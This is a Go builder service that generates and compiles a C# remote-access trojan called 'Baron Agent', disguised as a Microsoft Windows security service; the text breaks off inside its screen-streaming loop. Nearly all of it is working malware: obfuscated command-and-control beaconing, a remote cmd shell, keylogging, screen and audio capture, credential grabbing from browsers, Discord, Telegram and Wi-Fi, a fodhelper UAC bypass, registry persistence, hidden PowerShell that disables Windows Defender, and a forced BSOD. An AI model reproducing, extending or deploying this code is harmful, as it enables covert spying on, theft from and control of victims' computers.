package service

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
	"time"
)

// BuilderService handles C# agent source generation
type BuilderService struct{}

// BuildParams represents the configuration for the agent
type BuildParams struct {
	ServerURL       string `json:"server"`
	Name            string `json:"name"`
	ID              string `json:"id"`
	BeaconInterval  int    `json:"beacon"`
	Hidden          bool   `json:"hidden"`
	Persistence     bool   `json:"persist"`
	AntiKill        bool   `json:"bsod"`
	DisableDefender bool   `json:"defender"`
	FakeError       bool   `json:"fake_error"`
	FakeErrorMsg    string `json:"fake_error_msg"`
	AntiAnalysis    bool   `json:"anti"`
	Debug           bool   `json:"debug"`
	SilentAdmin     bool   `json:"silent_admin"`
	BuildSig        string `json:"-"`
	StrKeyHex       string `json:"-"`
	EncServer       string
	EncID           string
	EncName         string
	EncCommKey      string
	EncFakeMsg      string
}

// GenerateSource generates the C# source code for the agent using the original Baron logic
func (s *BuilderService) GenerateSource(p BuildParams) (string, error) {
	tmpl, err := template.New("agent").Parse(csharpTemplate)
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err := tmpl.Execute(&buf, p); err != nil {
		return "", err
	}

	return buf.String(), nil
}

// EncryptString XOR encrypts a string and returns base64
func (s *BuilderService) EncryptString(text string, key []byte) string {
	textBytes := []byte(text)
	encrypted := make([]byte, len(textBytes))
	for i := 0; i < len(textBytes); i++ {
		encrypted[i] = textBytes[i] ^ key[i%len(key)]
	}
	return base64.StdEncoding.EncodeToString(encrypted)
}

// PrepareParams encrypts sensitive fields and prepares the BuildParams for the template
func (s *BuilderService) PrepareParams(p *BuildParams) {
	// Generate random keys
	strKey := make([]byte, 16)
	rand.Read(strKey)
	p.StrKeyHex = hex.EncodeToString(strKey)

	commKey := make([]byte, 32)
	rand.Read(commKey)
	commKeyHex := hex.EncodeToString(commKey)

	// Encrypt fields
	p.EncServer = s.EncryptString(p.ServerURL, strKey)
	p.EncID = s.EncryptString(p.ID, strKey)
	p.EncName = s.EncryptString(p.Name, strKey)
	p.EncCommKey = s.EncryptString(commKeyHex, strKey)
	p.EncFakeMsg = s.EncryptString(p.FakeErrorMsg, strKey)
}

// Compile compiles the C# source into an executable.
// Tries dotnet build first, falls back to mcs (Mono).
// Enforces a 60-second compilation timeout.
func (s *BuilderService) Compile(source string, name string, hidden bool) (string, error) {
	tmpDir := filepath.Join(os.TempDir(), "baron_builds")
	os.MkdirAll(tmpDir, 0755)

	sourcePath := filepath.Join(tmpDir, name+".cs")
	exePath := filepath.Join(tmpDir, name+".exe")

	if err := os.WriteFile(sourcePath, []byte(source), 0644); err != nil {
		return "", err
	}
	// Always clean up the source file after compilation attempt
	defer os.Remove(sourcePath)

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	target := "exe"
	if hidden {
		target = "winexe"
	}

	cmd := exec.CommandContext(ctx, "mcs",
		"-unsafe",
		"-target:"+target,
		"-optimize+",
		"-out:"+exePath,
		"-r:System.dll",
		"-r:System.Net.Http.dll",
		"-r:System.Drawing.dll",
		"-r:System.Windows.Forms.dll",
		"-r:System.Management.dll",
		"-r:System.Security.dll",
		"-r:System.IO.Compression.dll",
		"-r:System.IO.Compression.FileSystem.dll",
		"-warn:0",
		sourcePath,
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			return "compilation timed out after 60s", err
		}
		return string(output), err
	}

	return exePath, nil
}

// csharpTemplate is the full C# template extracted and improved from Baron C2
const csharpTemplate = `
// ==================================================================
// BARON Agent v4.0 -- Generated Build
// Build Signature: {{.BuildSig}}
// ==================================================================

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Net.WebSockets;
using System.Threading;
using System.Collections.Generic;
using System.Collections.Concurrent;
using System.Threading.Tasks;
using System.IO.Compression;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Management;
using System.Windows.Forms;

[assembly: System.Reflection.AssemblyTitle("Windows Security Health Service")]
[assembly: System.Reflection.AssemblyDescription("Microsoft Windows Security")]
[assembly: System.Reflection.AssemblyCompany("Microsoft Corporation")]
[assembly: System.Reflection.AssemblyProduct("Microsoft Windows Operating System")]
[assembly: System.Reflection.AssemblyCopyright("Microsoft Corporation. All rights reserved.")]
[assembly: System.Reflection.AssemblyVersion("10.0.19041.1")]

namespace WinSecHealthSvc
{
    // ---- WASAPI COM Interfaces ----
    [ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")]
    class MMDeviceEnumerator { }

    [ComImport, Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDeviceEnumerator {
        int EnumAudioEndpoints(int dataFlow, int stateMask, out IntPtr devices);
        int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice device);
    }

    [ComImport, Guid("D666063F-1587-4E43-81F1-B948E807363F"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IMMDevice {
        int Activate([MarshalAs(UnmanagedType.LPStruct)] Guid iid, int clsCtx,
            IntPtr activationParams, [MarshalAs(UnmanagedType.IUnknown)] out object obj);
    }

    [ComImport, Guid("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IAudioClient {
        int Initialize(int shareMode, int streamFlags, long bufferDuration,
            long periodicity, IntPtr format, [MarshalAs(UnmanagedType.LPStruct)] Guid sessionGuid);
        int GetBufferSize(out uint numBufferFrames);
        int GetStreamLatency(out long latency);
        int GetCurrentPadding(out uint numPaddingFrames);
        int IsFormatSupported(int shareMode, IntPtr format, out IntPtr closestMatch);
        int GetMixFormat(out IntPtr format);
        int GetDevicePeriod(out long defaultPeriod, out long minimumPeriod);
        int Start();
        int Stop();
        int Reset();
        int SetEventHandle(IntPtr eventHandle);
        int GetService([MarshalAs(UnmanagedType.LPStruct)] Guid iid,
            [MarshalAs(UnmanagedType.IUnknown)] out object obj);
    }

    [ComImport, Guid("C8ADBD64-E71E-48a0-A4DE-185C395CD317"),
     InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    interface IAudioCaptureClient {
        int GetBuffer(out IntPtr dataPtr, out uint numFramesAvailable,
            out uint flags, out ulong devicePosition, out ulong qpcPosition);
        int ReleaseBuffer(uint numFramesRead);
        int GetNextPacketSize(out uint numFramesInNextPacket);
    }

    [StructLayout(LayoutKind.Sequential)]
    struct WAVEFORMATEX {
        public ushort wFormatTag;
        public ushort nChannels;
        public uint nSamplesPerSec;
        public uint nAvgBytesPerSec;
        public ushort nBlockAlign;
        public ushort wBitsPerSample;
        public ushort cbSize;
    }

    static class Agent
    {
        // ---- Encrypted Configuration ----
        static readonly byte[] _strKey = HexToBytes("{{.StrKeyHex}}");
        static string _server;
        static string _clientId;
        static string _processName;
        static string _commKeyHex;
        static int _beaconInterval = {{.BeaconInterval}};
        static bool _debug = {{if or .Debug (not .Hidden)}}true{{else}}false{{end}};
        static bool _silentAdmin = {{if .SilentAdmin}}true{{else}}false{{end}};

        static void Log(string msg) {
            if(_debug) {
                try {
                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.Write("[" + DateTime.Now.ToString("HH:mm:ss") + "] ");
                    Console.ResetColor();
                    Console.WriteLine(msg);
                } catch {}
            }
        }

        // ---- State ----
        static bool _running = true;
        static bool _screenStreaming = false;
        static bool _audioStreaming = false;
        static bool _keylogRunning = false;
        static StringBuilder _keylog = new StringBuilder();

        // ---- String Decryption (XOR) ----
        static string DecStr(string b64) {
            byte[] enc = Convert.FromBase64String(b64);
            byte[] dec = new byte[enc.Length];
            for (int i = 0; i < enc.Length; i++)
                dec[i] = (byte)(enc[i] ^ _strKey[i % _strKey.Length]);
            return Encoding.UTF8.GetString(dec);
        }

        static byte[] HexToBytes(string hex) {
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < hex.Length; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        // ---- Hidden PowerShell Execution ----
        static void RunHiddenPS(string cmd) {
            try {
                var p = new ProcessStartInfo {
                    FileName = "powershell.exe",
                    Arguments = "-NoP -NonI -W Hidden -Enc " +
                        Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(cmd)),
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
                Process.Start(p);
            } catch {}
        }

        // ---- HMAC Signing ----
        static string SignMessage(string data) {
            if (string.IsNullOrEmpty(_commKeyHex)) return "";
            byte[] key = HexToBytes(_commKeyHex);
            using (var hmac = new System.Security.Cryptography.HMACSHA256(key)) {
                byte[] hash = hmac.ComputeHash(Encoding.UTF8.GetBytes(data));
                return BitConverter.ToString(hash).Replace("-", "").ToLower();
            }
        }

        // ==== MAIN ====
        [STAThread]
        static void Main() {
            try {
                // Ensure we see something immediately
                Console.WriteLine(">>> Baron Agent Initializing...");
                
                if (IsAdministrator()) {
                    CleanupRegistryKey();
                } else if (_silentAdmin) {
                    TrySilentElevate();
                }

                // Force TLS 1.2
                System.Net.ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)3072;
                System.Net.ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };

                // Decrypt config
                _server = DecStr("{{.EncServer}}");
                _processName = DecStr("{{.EncName}}");
                _commKeyHex = DecStr("{{.EncCommKey}}");
                
                Log("Config decrypted. Server: " + _server);

                // Prevent multiple instances with a unique ID based on the server URL
                string mName = "Global\\Baron_" + _server.GetHashCode().ToString("X");
                bool createdNew;
                using (var mutex = new System.Threading.Mutex(true, mName, out createdNew)) {
                    if (!createdNew) {
                        Log("Another instance is already running. Exiting.");
                        Thread.Sleep(2000);
                        return;
                    }

                    _clientId = GetHWID();
                    Log("=== AGENT STARTING [" + _clientId + "] ===");

                    {{if .FakeError}}
                    new Thread(() => MessageBox.Show(DecStr("{{.EncFakeMsg}}"), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)).Start();
                    {{end}}

                    bool registered = false;
                    while (_running) {
                        try { 
                            if (!registered) {
                                registered = Register();
                            }
                            
                            if (registered) {
                                Beacon(); 
                            }
                        } catch (Exception ex) { Log("Loop Error: " + ex.Message); }
                        Thread.Sleep(_beaconInterval + new Random().Next(1000));
                    }
                }
            } catch (Exception ex) {
                Console.WriteLine("CRITICAL ERROR: " + ex.ToString());
                Thread.Sleep(10000);
            }
        }

        // ==== COMMS ====
        static string Post(string url, string json) {
            try {
                url = url.Replace("//api", "/api");
                Log("POST " + url);
                var req = (HttpWebRequest)WebRequest.Create(url);
                req.Method = "POST";
                req.ContentType = "application/json";
                req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
                req.Timeout = 15000;

                string sig = SignMessage(json);
                if (!string.IsNullOrEmpty(sig)) req.Headers.Add("X-Signature", sig);
                req.Headers.Add("X-Client-ID", _clientId);

                byte[] data = Encoding.UTF8.GetBytes(json);
                req.ContentLength = data.Length;
                using (var s = req.GetRequestStream()) s.Write(data, 0, data.Length);
                using (var r = (HttpWebResponse)req.GetResponse()) {
                    Log("RESPONSE: " + (int)r.StatusCode);
                    using (var sr = new StreamReader(r.GetResponseStream())) return sr.ReadToEnd();
                }
            } catch (Exception ex) { 
                Log("COMMS ERROR: " + ex.Message);
                return "{}"; 
            }
        }

        static void Beacon() {
            try {
                string json = "{\"id\":\"" + Esc(_clientId) + "\",\"hwid\":\"" + Esc(GetHWID()) + "\"}";
                string resp = Post(_server + "/api/agent/beacon", json);

                if (resp.Length > 10) Log("RAW RESPONSE: " + resp);

                if (resp.Contains("\"id\"")) {
                    Log("Received tasks from server.");
                    int pos = 0;
                    while ((pos = resp.IndexOf("{\"id\":", pos)) != -1) {
                        int end = resp.IndexOf("}", pos);
                        if (end == -1) break;
                        string t = resp.Substring(pos, end - pos + 1);
                        pos = end;

                        string tid = GetJsonVal(t, "id");
                        string cmd = GetJsonVal(t, "cmd");
                        if (!string.IsNullOrEmpty(tid) && !string.IsNullOrEmpty(cmd)) {
                            ExecuteTask(tid, cmd);
                        }
                    }
                }
            } catch (Exception ex) { Log("BEACON ERROR: " + ex.Message); }
        }

        static bool Register() {
            try {
                Log("Attempting registration...");
                string hostname = Environment.MachineName;
                string username = Environment.UserName;
                string os = Environment.OSVersion.ToString();
                bool isAdmin = false;
                try {
                    isAdmin = new System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                } catch {}
                
                string hwid = GetHWID();

                string json = "{\"id\":\"" + Esc(_clientId) + "\",\"hostname\":\"" + Esc(hostname) + "\",\"username\":\"" + Esc(username) + "\",\"os\":\"" + Esc(os) + "\",\"is_admin\":" + (isAdmin ? "true" : "false") + ",\"version\":\"4.0\",\"fingerprint\":\"" + Esc(hwid) + "\"}";
                string resp = Post(_server + "/api/agent/register", json);
                if(resp.Contains("\"ok\":true")) {
                    Log("Registration SUCCESSFUL.");
                    string newId = GetJsonVal(resp, "id");
                    if (!string.IsNullOrEmpty(newId)) {
                        _clientId = newId;
                        Log("ID Synchronized: " + _clientId);
                    }
                    return true;
                }
                else Log("Registration FAILED: " + resp);
            } catch (Exception ex) { Log("REGISTER ERROR: " + ex.Message); }
            return false;
        }

        static string GetHWID() {
            try {
                // Try MachineGuid from Registry (Best for persistence)
                try {
                    using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography")) {
                        if (key != null) {
                            var guid = key.GetValue("MachineGuid");
                            if (guid != null) return SignMessage(guid.ToString()).Substring(0, 8).ToUpper();
                        }
                    }
                } catch {}

                // Fallback: CPUID + HW Info
                string mId = "";
                try {
                    using (var mc = new ManagementClass("Win32_Processor")) {
                        foreach (var mo in mc.GetInstances()) {
                            mId += mo.Properties["ProcessorId"].Value.ToString();
                            break;
                        }
                    }
                } catch {}
                
                if (string.IsNullOrEmpty(mId)) {
                    mId = Environment.MachineName + "_" + Environment.ProcessorCount;
                }
                
                string hash = SignMessage(mId);
                if (string.IsNullOrEmpty(hash) || hash.Length < 8) {
                    return "ID-" + Math.Abs(mId.GetHashCode()).ToString("X");
                }
                
                return hash.Substring(0, 8).ToUpper();
            } catch { 
                return "AGENT-" + Environment.MachineName.GetHashCode().ToString("X"); 
            }
        }

        static bool IsAdministrator() {
            try {
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent()) {
                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
                    return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                }
            } catch { return false; }
        }

        static void TrySilentElevate() {
            try {
                string myPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string regPath = @"Software\Classes\ms-settings\Shell\open\command";
                using (var key = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regPath)) {
                    if (key == null) return;
                    key.SetValue("", myPath);
                    key.SetValue("DelegateExecute", "");
                }
                Process.Start(new ProcessStartInfo {
                    FileName = "fodhelper.exe",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                });
                Environment.Exit(0);
            } catch (Exception ex) { Log("Elevation failed: " + ex.Message); }
        }

        static void CleanupRegistryKey() {
            try {
                Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
            } catch {}
        }

        static string GetJsonVal(string json, string key) {
            try {
                string pattern = "\"" + key + "\":\"";
                int start = json.IndexOf(pattern);
                if (start == -1) return "";
                start += pattern.Length;
                int end = json.IndexOf("\"", start);
                if (end == -1) return "";
                return json.Substring(start, end - start);
            } catch { return ""; }
        }

        static void ExecuteTask(string tid, string command) {
            new Thread(() => {
            try {
                Log("TASK [" + tid + "]: " + command);
                string output = "";
                string[] parts = command.Split(new char[] { ' ' }, 2);
                string cmdName = parts[0].ToLower().Trim();
                string args = parts.Length > 1 ? parts[1] : "";

                switch (cmdName) {
                    case "shell":
                        try {
                            var p2 = new Process { StartInfo = new ProcessStartInfo { FileName = "cmd.exe", Arguments = "/c " + args, UseShellExecute = false, RedirectStandardOutput = true, RedirectStandardError = true, CreateNoWindow = true } };
                            p2.Start(); p2.WaitForExit(15000);
                            output = p2.StandardOutput.ReadToEnd() + p2.StandardError.ReadToEnd();
                            if (string.IsNullOrWhiteSpace(output)) output = "[no output]";
                        } catch (Exception ex) { output = "shell error: " + ex.Message; }
                        break;
                    case "info":
                        output = GetSysInfo();
                        break;
                    case "grabber":
                    case "grab":
                        output = GrabAll();
                        break;
                    case "processes":
                    case "ps_list":
                        output = GetProcessList();
                        break;
                    case "ps_kill":
                        try { Process.GetProcessById(int.Parse(args)).Kill(); output = "Killed PID " + args; } catch (Exception e) { output = "Kill failed: " + e.Message; }
                        break;
                    case "ps_suspend":
                        try { NtSuspendProcess(Process.GetProcessById(int.Parse(args)).Handle); output = "Suspended PID " + args; } catch (Exception e) { output = "Suspend failed: " + e.Message; }
                        break;
                    case "ps_resume":
                        try { NtResumeProcess(Process.GetProcessById(int.Parse(args)).Handle); output = "Resumed PID " + args; } catch (Exception e) { output = "Resume failed: " + e.Message; }
                        break;
                    case "defender":
                        RunHiddenPS("Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true");
                        try { var rk2 = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"); rk2.SetValue("DisableAntiSpyware",1,Microsoft.Win32.RegistryValueKind.DWord); rk2.Close(); } catch {}
                        output = "Defender disabled";
                        break;
                    case "screenshot":
                        output = TakeScreenshot();
                        break;
                    case "screen_start":
                        if (!_screenStreaming) { _screenStreaming = true; new Thread(ScreenStreamLoop) { IsBackground = true }.Start(); output = "Stream started"; }
                        else output = "Already streaming";
                        break;
                    case "screen_stop":
                        _screenStreaming = false; output = "Stream stopped";
                        break;
                    case "audio_start":
                        if (!_audioStreaming) { 
                            _audioStreaming = true; 
                            Task.Run(async () => {
                                string res = await AudioStreamLoop();
                                Log("Audio start: " + res);
                            });
                            output = "Audio stream requested (check logs for status)"; 
                        }
                        else output = "Already streaming audio";
                        break;
                    case "audio_stop":
                        _audioStreaming = false; output = "Audio stream stopped";
                        break;
                    case "keylogger":
                    case "keylog_start":
                        if (!_keylogRunning) { _keylogRunning = true; _keylog.Clear(); new Thread(KeyloggerLoop) { IsBackground = true }.Start(); new Thread(KeyloggerStreamer) { IsBackground = true }.Start(); output = "Keylogger started"; }
                        else output = "Already running";
                        break;
                    case "keylog_stop":
                        _keylogRunning = false; output = "Keylogger stopped:\n" + _keylog.ToString(); _keylog.Clear();
                        break;
                    case "keylog_dump":
                        output = "Keylog:\n" + _keylog.ToString();
                        break;
                    case "browsers":
                        output = GrabBrowsers();
                        break;
                    case "grabber":
                        output = GrabAll();
                        break;
                    case "discord":
                        output = GrabDiscord();
                        break;
                    case "telegram":
                        output = GrabTelegram();
                        break;
                    case "wifi":
                        output = GrabWifi();
                        break;
                    case "persist_install":
                        try {
                            string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
                            var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                            rk?.SetValue("WindowsSecurityHealthService", "\"" + me + "\""); rk?.Close();
                            string sf = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                            File.Copy(me, Path.Combine(sf, Path.GetFileName(me)), true);
                            output = "Persistence installed";
                        } catch (Exception ex) { output = "persist error: " + ex.Message; }
                        break;
                    case "uac_bypass":
                        try {
                            string me2 = System.Reflection.Assembly.GetExecutingAssembly().Location;
                            var k = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\Shell\Open\command");
                            k.SetValue("", me2); k.SetValue("DelegateExecute", ""); k.Close();
                            Process.Start(new ProcessStartInfo { FileName = "fodhelper.exe", CreateNoWindow = true, UseShellExecute = false });
                            Thread.Sleep(2000);
                            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
                            output = "UAC bypass attempted";
                        } catch (Exception ex) { output = "uac error: " + ex.Message; }
                        break;
                    case "bsod":
                        try { bool pb; RtlSetProcessIsCritical(true, out pb, false); Process.GetCurrentProcess().Kill(); } catch {}
                        output = "BSOD triggered";
                        break;
                    case "msg":
                        new Thread(() => MessageBox.Show(args, "System Message", MessageBoxButtons.OK, MessageBoxIcon.Information)).Start();
                        output = "Message displayed";
                        break;
                    case "kill":
                        _running = false; output = "Agent terminated";
                        break;
                    case "uninstall":
                        try {
                            Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run",true)?.DeleteValue("WindowsSecurityHealthService",false);
                            _running = false;
                            string me3 = System.Reflection.Assembly.GetExecutingAssembly().Location;
                            Process.Start(new ProcessStartInfo { FileName="cmd.exe", Arguments="/c ping 127.0.0.1 -n 3 & del /f /q \""+me3+"\"", CreateNoWindow=true, UseShellExecute=false });
                            output = "Uninstalling";
                            Res(tid, output);
                            new Thread(() => { Thread.Sleep(1000); Environment.Exit(0); }) { IsBackground = true }.Start();
                            return;
                        } catch (Exception ex) { output = "uninstall error: " + ex.Message; }
                        break;
                    default:
                        output = "Unknown command: " + cmdName;
                        break;
                }
                Res(tid, output);
            } catch (Exception ex) { Res(tid, "Fatal: " + ex.Message); }
            }) { IsBackground = true }.Start();
        }

        static void Res(string tid, string data) {
            string json = "{\"id\":\"" + Esc(_clientId) + "\",\"task_id\":\"" + Esc(tid) + "\",\"data\":\"" + Esc(data) + "\"}";
            Post(_server + "/api/agent/result", json);
        }

        static string Esc(string s) {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
        }

        // ==== MODULES ====
        {{if .Persistence}}
        static void InstallPersistenceQuiet() {
            try {
                string me = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                if (rk != null) { rk.SetValue("WindowsSecurityHealthService", "\"" + me + "\""); rk.Close(); }
            } catch {}
        }
        {{end}}


        {{if .AntiKill}}
        static void StartAntiKill() {
            try { bool old; RtlSetProcessIsCritical(true, out old, false); } catch {}
        }
        {{end}}


        {{if .DisableDefender}}
        static void DisableDefender() {
            try {
                var psi = new ProcessStartInfo {
                    FileName = "powershell.exe",
                    Arguments = "-WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
                Process.Start(psi);
            } catch {}
        }
        {{end}}

        {{if .AntiAnalysis}}
        static void AntiAnalysisCheck() {
            if (System.Diagnostics.Debugger.IsAttached) Environment.Exit(0);
        }
        {{end}}

        // ─────────────────────────────────────────────────────────────
        // P/Invoke declarations (always present)
        // ─────────────────────────────────────────────────────────────
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, KbHookProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        static extern int GetMessage(out KbMsg lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
        [DllImport("user32.dll")]
        static extern bool TranslateMessage([In] ref KbMsg lpMsg);
        [DllImport("user32.dll")]
        static extern IntPtr DispatchMessage([In] ref KbMsg lpmsg);
        [DllImport("user32.dll")] static extern int ToUnicode(uint virtualKey, uint scanCode, byte[] keyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder receiveBuffer, int bufferSize, uint flags);
        [DllImport("user32.dll")] static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")] static extern uint MapVirtualKey(uint uCode, uint uMapType);
        [DllImport("ntdll.dll", PreserveSig = false)]
        public static extern void NtSuspendProcess(IntPtr processHandle);
        [DllImport("ntdll.dll", PreserveSig = false)]
        public static extern void NtResumeProcess(IntPtr processHandle);
        [DllImport("ntdll.dll")] static extern int RtlSetProcessIsCritical(bool n, out bool o, bool p2);
        delegate IntPtr KbHookProc(int n, IntPtr w, IntPtr l);
        [StructLayout(LayoutKind.Sequential)]
        struct KbMsg { public IntPtr h; public uint msg; public IntPtr w; public IntPtr l; public uint t; public int x; public int y; }
        static IntPtr _hook = IntPtr.Zero;
        static KbHookProc _kbProc;

        // ─────────────────────────────────────────────────────────────
        static string GetSysInfo() {
            var sb = new StringBuilder();
            sb.AppendLine("Host:  " + Environment.MachineName);
            sb.AppendLine("User:  " + Environment.UserDomainName + "\\" + Environment.UserName);
            sb.AppendLine("OS:    " + Environment.OSVersion + " " + (IntPtr.Size == 8 ? "x64" : "x86"));
            sb.AppendLine("CPUs:  " + Environment.ProcessorCount);
            bool adm = false;
            try { adm = new System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent()).IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator); } catch {}
            sb.AppendLine("Admin: " + adm);
            try { using (var mc = new ManagementClass("Win32_ComputerSystem")) foreach (ManagementObject mo in mc.GetInstances()) sb.AppendLine("RAM MB:" + Convert.ToUInt64(mo["TotalPhysicalMemory"])/1024/1024); } catch {}
            try { using (var mc = new ManagementClass("Win32_Processor")) foreach (ManagementObject mo in mc.GetInstances()) sb.AppendLine("CPU:   " + mo["Name"]); } catch {}
            try { using (var mc = new ManagementClass("Win32_VideoController")) foreach (ManagementObject mo in mc.GetInstances()) sb.AppendLine("GPU:   " + mo["Caption"]); } catch {}
            foreach (var d in DriveInfo.GetDrives()) { try { if (d.IsReady) sb.AppendLine(d.Name + " " + d.DriveType + " " + d.TotalFreeSpace/1073741824 + "GB/" + d.TotalSize/1073741824 + "GB"); } catch {} }
            return sb.ToString();
        }

        static string GetProcessList() {
            var sb = new StringBuilder("[");
            var procs = Process.GetProcesses();
            Array.Sort(procs, (a, b2) => a.Id.CompareTo(b2.Id));
            bool first = true;
            foreach (var pr in procs) {
                try { 
                    if (!first) sb.Append(",");
                    string pName = pr.ProcessName.Replace("\\", "\\\\").Replace("\"", "\\\"");
                    sb.Append("{\"pid\":"+pr.Id+",\"name\":\""+pName+"\",\"mem\":"+Math.Round(pr.WorkingSet64/1048576.0,1)+"}");
                    first = false;
                } catch {}
            }
            sb.Append("]");
            return sb.ToString();
        }

        static string TakeScreenshot() {
            try {
                var b = Screen.PrimaryScreen.Bounds;
                using (var bmp = new Bitmap(b.Width, b.Height)) {
                    using (var g = Graphics.FromImage(bmp)) g.CopyFromScreen(b.Location, Point.Empty, b.Size);
                    using (var ms = new System.IO.MemoryStream()) { bmp.Save(ms, ImageFormat.Jpeg); return Convert.ToBase64String(ms.ToArray()); }
                }
            } catch (Exception ex) { return "screenshot error: " + ex.Message; }
        }

        static async void ScreenStreamLoop() {
            var ws = new ClientWebSocket();
            try {
                string wsUrl = _server.Replace("http", "ws") + "/api/agent/stream_ws?id=" + _clientId;
                await ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None);
            } catch { return; }

            var ep = new EncoderParameters(1);
            ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 60L);
            var jc = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
            
            int grid = 32;
            var bounds = Screen.PrimaryScreen.Bounds;
            Dictionary<int, ulong> hashes = new Dictionary<int, ulong>();
            DateTime lastKeyFrame = DateTime.MinValue;
            var sw = new Stopwatch();

            while (_screenStreaming && ws.State == WebSocketState.Open) {
                sw.Restart();
                try {
                    bool forceKeyFrame = (DateTime.UtcNow - lastKeyFrame).TotalSeconds > 5;
                    using (var fullBmp = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb)) {
                        using (var g = Graphics.FromImage(fullBmp)) g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
                        
                        if (forceKeyFrame) {
                            lastKeyFrame = DateTime.UtcNow;
                            using (var ms = new MemoryStream()) {
                                fullBmp.Save(ms, jc, ep);
                                byte[] jpeg = ms.ToArray();
                                // [Type:1][Codec:1][PLen:2] [W:2][H:2] [JPEG...]
                                byte[] pkt = new byte[8 + jpeg.Length];
                                pkt[0] = 0x01; // Key
                                pkt[1] = 0x00; // Jpeg
                                BitConverter.GetBytes((ushort)(jpeg.Length + 4)).CopyTo(pkt, 2);
                                BitConverter.GetBytes((ushort)bounds.Width).CopyTo(pkt, 4);
                                BitConverter.GetBytes((ushort)bounds.Height).CopyTo(pkt, 6);
                                Buffer.BlockCopy(jpeg, 0, pkt, 8, jpeg.Length);
                                await ws.SendAsync(new ArraySegment<byte>(pkt), WebSocketMessageType.Binary, true, CancellationToken.None);
                            }
                            hashes.Clear();
                        }

                        for (int y = 0; y < bounds.Height; y += grid) {
                            for (int x = 0; x < bounds.Width; x += grid) {
                                int w = Math.Min(grid, bounds.Width - x);
                                int h = Math.Min(grid, bounds.Height - y);
